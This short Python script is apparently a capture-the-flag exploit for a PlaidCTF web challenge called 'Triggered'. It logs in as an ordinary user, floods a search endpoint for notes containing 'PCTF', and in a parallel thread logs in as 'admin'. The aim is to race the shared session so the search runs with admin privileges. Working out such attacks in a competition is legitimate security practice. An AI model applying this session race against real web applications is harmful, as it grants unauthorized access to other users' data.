#!/usr/bin/python

import requests
import threading
import time

s = requests.session()

def login(username):

    url = "http://triggered.pwni.ng:52856/login"
    data = {"username":username}

    res = s.post(url,data=data)

    print("[*] login with username")
#     print(res.text)

def login_password(password):
    url = "http://triggered.pwni.ng:52856/login/password"
    data = {"password":password}

    res = s.post(url,data=data)
    print("[*] login with password")
#     print(res.text)

def query(condition):
    url = "http://triggered.pwni.ng:52856/search"
    data = {"query":condition}

    while True:
        res = s.post(url,data=data)
        print("[*] query a note ...")
        if "no result" not in res.text:
            print(res.text)
            break
        elif res.status_code != 200 :
            break

if __name__ == '__main__':

    login("rebirth1")
    login_password("123")

    t1 = threading.Thread(target=query,args=(" \"PCTF\" or "*10+ " \"PCTF\" " ,))
    t1.start()
    # time.sleep(3)
    t2 = threading.Thread(target=login,args=("admin",))
    t2.start()